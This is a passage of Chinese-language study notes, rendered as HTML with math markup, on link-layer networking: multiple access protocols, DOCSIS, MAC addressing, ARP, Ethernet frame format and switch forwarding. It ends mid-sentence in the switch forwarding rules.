<p>multiple access protocol 有非常多<span class="mojikumi-line-end">，</span>总体可以分为三大类<span class="mojikumi-line-end">：</span>channel partitioning protocols<span class="mojikumi-line-end">、</span>ramdom access protocols<span class="mojikumi-line-end">、</span>taking-turns protocols<span class="mojikumi-line-end">。</span></p>
<h3 id="channel-partitioning-protocols" class="heading"><a href="#channel-partitioning-protocols" class="heading-anchor" aria-label="章节： Channel Partitioning Protocols" tabindex="-1"></a><span>Channel Partitioning Protocols</span></h3>
<p>将单个 channel 分成多个 channel<span class="mojikumi-line-end">。</span></p>
<p>TDM (time-division multiplexing) 将时间分成 time frames<span class="mojikumi-line-end">，</span>将每个 time frame 分成 time slots<span class="mojikumi-line-end">，</span>将每个 time frame 内的各个 time slot 分配给各个 node<span class="mojikumi-line-end">。</span></p>
<p>FDM (frequency-division multiplexing) 利用不同的频率作为不同的 channel<span class="mojikumi-line-end">。</span></p>
<p>TDM 和 FDM 都能完全避免 collision<span class="mojikumi-line-end">，</span>但在只有一方发送时效率非常低<span class="mojikumi-line-end">：</span>唯一的 active sender 不能使用分配给其他 node 的 channel<span class="mojikumi-line-end">。</span></p>
<p>CDMA (code-division multiple access) 通过给每个 node 分配一个 code 来允许各方同时发送<span class="mojikumi-line-end">，</span>在 wireless channel 中较为常用<span class="mojikumi-line-end">。</span></p>
<h3 id="random-access-protocols" class="heading"><a href="#random-access-protocols" class="heading-anchor" aria-label="章节： Random Access Protocols" tabindex="-1"></a><span>Random Access Protocols</span></h3>
<p>通过随机的等待时间来在 collision 发生后错开发送时机<span class="mojikumi-line-end">。</span></p>
<h4 id="aloha" class="heading"><a href="#aloha" class="heading-anchor" aria-label="章节： ALOHA" tabindex="-1"></a><span>ALOHA</span></h4>
<p>假设传输每个 frame 的用时相同<span class="mojikumi-line-end">，</span>将时间划分为长度为这一用时的 slots<span class="mojikumi-line-end">，</span>所有 node 是同步的<span class="mojikumi-line-end">，</span>只在 slot 的开头发送信息<span class="mojikumi-line-end">，</span>发生 collision 后能在这一 slot 内检测到<span class="mojikumi-line-end">。</span></p>
<p>slotted ALOHA 在没有 collision 时在每个 slot 开头发送 frame<span class="mojikumi-line-end">，</span>在发生了 collision 后在每个 slot 开头以 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></span> 的概率进行 retransmission 直到发送成功为止<span class="mojikumi-line-end">。</span></p>
<p>如果一个 slot 中没有任何一方发送信息或者有多方同时发送信息则这个 slot 就浪费掉了<span class="mojikumi-line-end">，</span>只有恰好有一方发送信息的 slot 才是 successful slot<span class="mojikumi-line-end">。</span></p>
<p>其 efficiency 就是 successful slot 的占比<span class="mojikumi-line-end">，</span>有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span> 个 active slot 时<span class="mojikumi-line-end">，</span>efficiency 为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>p</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">np(1-p)^{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span> 很大时<span class="mojikumi-line-end">，</span>其最大值是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>e</mi><mo>≈</mo><mn>0.37</mn></mrow><annotation encoding="application/x-tex">1/e \approx 0.37</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.37</span></span></span></span></span><span class="mojikumi-line-end">。</span></p>
<p>pure ALOHA 不进行 time slot 的划分<span class="mojikumi-line-end">，</span>或者说是每一方的 time slot 不是同步的<span class="mojikumi-line-end">，</span>这样更加去中心化<span class="mojikumi-line-end">，</span>但 efficiency 只有 slotted ALOHA 的一半<span class="mojikumi-line-end">。</span></p>
<h4 id="csmacd" class="heading"><a href="#csmacd" class="heading-anchor" aria-label="章节： CSMA(/CD)" tabindex="-1"></a><span>CSMA(/CD)</span></h4>
<p>CSMA (carrier sense multiple access) 基于 <span class="mojikumi">“</span>listen before speaking<span class="mojikumi">”</span> 的原则<span class="mojikumi-line-end">，</span>进行 <i>carrier sensing</i><span class="mojikumi-line-end">。</span></p>
<p>如果再加上 <span class="mojikumi">“</span>If someone else begins talking at the same time, stop talking<span class="mojikumi">”</span> 的原则<span class="mojikumi-line-end">，</span>即 <i>collision detection</i><span class="mojikumi-line-end">，</span>则是 CSMA/CD<span class="mojikumi-line-end">。</span></p>
<p>在理想状态下<span class="mojikumi-line-end">，</span>carrier sensing 可以完全消除 collision<span class="mojikumi-line-end">。</span>但实际上<span class="mojikumi-line-end">，</span>由于 propagation delay<span class="mojikumi-line-end">，</span>一方开始发送到另一方收到需要时间<span class="mojikumi-line-end">，</span>在这段时间内可能另一方也发送了信息<span class="mojikumi-line-end">。</span></p>
<p>在 CSMA/CD 中<span class="mojikumi-line-end">，</span>遇到 collision 需要等待一段时间再 retransmit<span class="mojikumi-line-end">，</span>等待时间通常由 binary exponential backoff 得到<span class="mojikumi-line-end">：</span>在一个范围内随机选择等待时间<span class="mojikumi-line-end">，</span>每多 retransmit 一次这个范围就加倍<span class="mojikumi-line-end">。</span>在 Ethernet 中<span class="mojikumi-line-end">，</span>第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span> 次 retransmission 会在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msup><mn>2</mn><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">0, 1, \ldots, 2^{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span> 中随机选择一个数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="mojikumi-line-end">，</span>然后等待传输 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>512</mn><mo>⋅</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">512 \cdot k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">512</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> bits 的用时<span class="mojikumi-line-end">，</span>而 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span> 超过 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></span> 时也取 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></span><span class="mojikumi-line-end">。</span>这里 retransmission 次数是每个 frame 分别计算的<span class="mojikumi-line-end">，</span>新的 frame 会从 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span> 开始<span class="mojikumi-line-end">。</span></p>
<p>CSMA/CD 的 efficiency 约为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><mn>5</mn><msub><mi>d</mi><mrow><mi mathvariant="normal">p</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">p</mi></mrow></msub><mi mathvariant="normal">/</mi><msub><mi>d</mi><mrow><mi mathvariant="normal">t</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">s</mi></mrow></msub></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\dfrac{1}{1 + 5 d_{\mathrm{prop}} / d_{\mathrm{trans}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.2935em;vertical-align:-0.9721em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">prop</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">trans</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mrow><mi mathvariant="normal">p</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">p</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d_{\mathrm{prop}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">prop</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span> 表示 propagation delay<span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mrow><mi mathvariant="normal">t</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">s</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d_{\mathrm{trans}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">trans</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 表示一个 maximum-size frame 的传输用时<span class="mojikumi-line-end">。</span></p>
<h3 id="taking-turns-protocols" class="heading"><a href="#taking-turns-protocols" class="heading-anchor" aria-label="章节： Taking-Turns Protocols" tabindex="-1"></a><span>Taking-Turns Protocols</span></h3>
<p>轮流让各方发送信息<span class="mojikumi-line-end">，</span>如果一方不想发送则交给下一位<span class="mojikumi-line-end">。</span></p>
<p>在 polling protocol 中<span class="mojikumi-line-end">，</span>设有一个 master node<span class="mojikumi-line-end">，</span>它轮流 poll 每个 node 来让它发送至多若干个 frame<span class="mojikumi-line-end">，</span>发完再 poll 下一个<span class="mojikumi-line-end">。</span>polling protocol 是 centralized 的<span class="mojikumi-line-end">，</span>有 single point of failure<span class="mojikumi-line-end">；</span>并且<span class="mojikumi-line-end">，</span>对 inactive node 的 poll 会造成浪费<span class="mojikumi-line-end">。</span></p>
<p>token-passing protocol 是 decentralized 的<span class="mojikumi-line-end">，</span>有一个 token 在各个 node 之间环状地传递<span class="mojikumi-line-end">，</span>拿着 token 就可以发送至多若干个 frame<span class="mojikumi-line-end">，</span>发送完<span class="mojikumi-line-start">（</span>或者不想发送<span class="mojikumi-line-end">）</span>就把 token 交给下一个<span class="mojikumi-line-end">。</span>token-passing protocol 在有任何一个 node 出错时就会卡住<span class="mojikumi-line-end">，</span>需要采取一些 recovery procedure<span class="mojikumi-line-end">。</span></p>
<h3 id="docsis-the-link-layer-protocol-for-cable-internet-access" class="heading"><a href="#docsis-the-link-layer-protocol-for-cable-internet-access" class="heading-anchor" aria-label="章节： DOCSIS: The Link-Layer Protocol for Cable Internet Access" tabindex="-1"></a><span>DOCSIS: The Link-Layer Protocol for Cable Internet Access</span></h3>
<p>DOCSIS 用于 cable access network<span class="mojikumi-line-end">，</span>将 residential cable modems 连接到 cable modem termination system (CMTS)<span class="mojikumi-line-end">。</span>它同时用到了多种 multiple access protocol<span class="mojikumi-line-end">，</span>是一个很好的例子<span class="mojikumi-line-end">。</span></p>
<p>使用 FDM 分为 downstream 和 upstream 两个 channel<span class="mojikumi-line-end">，</span>其中 downstream channel 由 CMTS 向 cable modem 发送<span class="mojikumi-line-end">，</span>sender 唯一<span class="mojikumi-line-end">，</span>比较简单<span class="mojikumi-line-end">。</span></p>
<p>upstream channel 被分成了若干 mini-slots<span class="mojikumi-line-start">（</span>与 TDM 类似<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>而这些 mini-slots 是由 CMTS 动态分配的<span class="mojikumi-line-end">，</span>需要由 cable modem 发送 mini-slot-request frame<span class="mojikumi-line-end">，</span>这些 request 在一些特殊的 mini-slots 以 random access 的方式发送<span class="mojikumi-line-end">，</span>通过是否收到来自 CMTS 的 mini-slot 分配来判断 request 是否成功发送<span class="mojikumi-line-end">，</span>使用 binary exponential backoff<span class="mojikumi-line-end">。</span></p>
<h2 id="switched-local-area-networks" class="heading"><a href="#switched-local-area-networks" class="heading-anchor" aria-label="章节： Switched Local Area Networks" tabindex="-1"></a><span>Switched Local Area Networks</span></h2>
<h3 id="link-layer-addressing" class="heading"><a href="#link-layer-addressing" class="heading-anchor" aria-label="章节： Link-Layer Addressing" tabindex="-1"></a><span>Link-Layer Addressing</span></h3>
<p>host 和 router 的每个 interface (adapter) 都有一个 link-layer address<span class="mojikumi-line-end">：</span>MAC address (physical address / LAN address)<span class="mojikumi-line-end">。</span></p>
<p>MAC address 的长度为 6 bytes<span class="mojikumi-line-end">，</span>与 IP address 不同<span class="mojikumi-line-end">，</span>物理上的每个 interface 的 MAC address 是固定的<span class="mojikumi-line-end">，</span>不会因移动而变化<span class="mojikumi-line-end">。</span>MAC address 由 IEEE 管理<span class="mojikumi-line-end">，</span>在全球范围内是唯一的<span class="mojikumi-line-end">。</span></p>
<p>如果使用 broadcast link<span class="mojikumi-line-end">，</span>多个 interface 都会收到同样的 frame<span class="mojikumi-line-end">。</span>只有 MAC address 符合时才会接收<span class="mojikumi-line-end">，</span>否则会丢弃<span class="mojikumi-line-start">（</span>不会传递给 network layer<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>MAC broadcast address 是 <code>ff<wbr>:<wbr>ff<wbr>:<wbr>ff<wbr>:<wbr>ff<wbr>:<wbr>ff<wbr>:<wbr>ff</code><span class="mojikumi-line-end">。</span></p>
<h3 id="address-resolution-protocol" class="heading"><a href="#address-resolution-protocol" class="heading-anchor" aria-label="章节： Address Resolution Protocol" tabindex="-1"></a><span>Address Resolution Protocol</span></h3>
<p>ARP 用来将 subnet 内部的 IP address 翻译为 MAC address<span class="mojikumi-line-end">。</span></p>
<p>每个 host / router 会维护一张 ARP table<span class="mojikumi-line-end">，</span>用来记录 IP address 和 MAC address 的对应关系<span class="mojikumi-line-end">。</span>表项有过期时间<span class="mojikumi-line-end">，</span>到期自动删除<span class="mojikumi-line-end">。</span></p>
<p>如果在 ARP table 内没有查询到需要的 IP address<span class="mojikumi-line-end">，</span>则会发送一个 ARP query<span class="mojikumi-line-start">（</span>一个 broadcast packet<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>具有这个 IP address 的 interface 在收到 ARP query 后会回复 ARP response<span class="mojikumi-line-start">（</span>一般不是 broadcast<span class="mojikumi-line-end">，</span>因为此时 broadcast 可能造成浪费<span class="mojikumi-line-end">；</span>但是若采用 broadcast 也有助于发现 address conflict<sup><a href="#user-content-fn-arp-response-broadcast" id="user-content-fnref-arp-response-broadcast" data-footnote-ref aria-describedby="footnote-label">1</a></sup><span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>收到 ARP response 后更新 ARP table<span class="mojikumi-line-end">。</span>通过这样的机制<span class="mojikumi-line-end">，</span>ARP table 可以自动建立<span class="mojikumi-line-end">，</span>不需要任何手动配置<span class="mojikumi-line-end">。</span></p>
<p>如果要向 subnet 外发送信息<span class="mojikumi-line-end">，</span>则需要向 gateway (first-hop router) 发送信息<span class="mojikumi-line-end">，</span>所以需要查询的是 gateway 的 MAC address<span class="mojikumi-line-end">。</span></p>
<h3 id="ethernet" class="heading"><a href="#ethernet" class="heading-anchor" aria-label="章节： Ethernet" tabindex="-1"></a><span>Ethernet</span></h3>
<p>Ethernet 是现在最常用的 wired LAN<span class="mojikumi-line-end">。</span></p>
<p>Ethernet 通常使用 hub 或 switch 来连接各个 interface<span class="mojikumi-line-end">。</span>hub 会将收到的每个 bit 转发给其他所有 interface<span class="mojikumi-line-end">，</span>可能产生 collision<span class="mojikumi-line-end">。</span>switch 则根据 MAC address 进行转发<span class="mojikumi-line-end">，</span>不会产生 collision<span class="mojikumi-line-end">。</span></p>
<p>Ethernet frame 包含<span class="mojikumi-line-end">：</span></p>
<ol>
<li>preamble (8 bytes): 31 个 <span class="mojikumi">“</span>10<span class="mojikumi">”</span> 和 1 个 <span class="mojikumi">“</span>11<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>用来标识 frame 的开头<span class="mojikumi-line-end">，</span>并同步时钟<span class="mojikumi-line-end">。</span></li>
<li>destination MAC address (6 bytes)</li>
<li>source MAC address (6 bytes)</li>
<li>type (2 bytes): upper layer protocol<span class="mojikumi-line-end">，</span>例如 IP<span class="mojikumi-line-end">、</span>ARP<span class="mojikumi-line-end">。</span></li>
<li>data (46 ~ 1500 bytes): 如果需要传送的数据不足 46 bytes 需要进行填充<span class="mojikumi-line-end">。</span>通过 type 以及 data 中的 header<span class="mojikumi-line-start">（</span>例如 IP header<span class="mojikumi-line-end">）</span>来判断 data 的长度<span class="mojikumi-line-end">。</span></li>
<li>CRC checksum (4 bytes)</li>
</ol>
<p>Ethernet 是 connectionless<span class="mojikumi-line-end">、</span>unreliable 的<span class="mojikumi-line-end">。</span></p>
<p>Ethernet 既是 link-layer protocol<span class="mojikumi-line-end">，</span>也是 physical layer protocol<span class="mojikumi-line-end">，</span>而且实际上是一类而非一个 protocol<span class="mojikumi-line-end">。</span>例如<span class="mojikumi-line-end">，</span>10BASE-T<span class="mojikumi-line-end">、</span>10BASE-2<span class="mojikumi-line-end">、</span>100BASE-T<span class="mojikumi-line-end">、</span>1000BASE-LX<span class="mojikumi-line-end">、</span>10GBASE-T<span class="mojikumi-line-end">、</span>40GBASE-T 是不同的 Ethernet technology<span class="mojikumi-line-end">。</span>开头表示 10Mbps<span class="mojikumi-line-end">、</span>100Mbps<span class="mojikumi-line-end">、</span>1Gbps<span class="mojikumi-line-end">、</span>10Gbps<span class="mojikumi-line-end">、</span>40Gbps 的传输速度<span class="mojikumi-line-end">，</span>BASE 表示 media 只传送 Ethernet traffic<span class="mojikumi-line-end">，</span>最后是不同的 physical media<span class="mojikumi-line-end">。</span></p>
<h3 id="link-layer-switches" class="heading"><a href="#link-layer-switches" class="heading-anchor" aria-label="章节： Link-Layer Switches" tabindex="-1"></a><span>Link-Layer Switches</span></h3>
<p>switch 和 router 的功能类似<span class="mojikumi-line-end">，</span>但它工作于 link layer<span class="mojikumi-line-end">，</span>而且是 <i>transparent</i> 的<span class="mojikumi-line-end">，</span>其他设备感受不到 switch 的存在<span class="mojikumi-line-end">，</span>也不需要手动进行任何配置<span class="mojikumi-line-end">。</span></p>
<p>switch 的每个 interface 都有一个 output buffer<span class="mojikumi-line-end">，</span>与 router 类似<span class="mojikumi-line-end">。</span></p>
<p>switch 维护了一张 switch table<span class="mojikumi-line-end">，</span>表示每个 MAC address 对应的 switch 的 interface<span class="mojikumi-line-end">，</span>以及表项的过期时间<span class="mojikumi-line-end">。</span></p>
<p>对于从 interface <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></span> 收到的 destination MAC address 为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 的 frame<span class="mojikumi-line-end">：</span></p>
<ol>
<li>若 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 不在 switch table 中<span class="mojikumi-line-end">，</span>broadcast<span class="mojikumi-line-end">；</span></li>
<li>若 switch table 中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 对应 interface <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></span><span class="mojikumi-line-end">，</span>discard<span class="mojikumi-line-end">；</span></li>
<li>若 switch table 中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 对应 interface <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo mathvariant="normal">≠</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y \ne x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></span><span class="mojikumi-line-end">，</span>forward to <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation 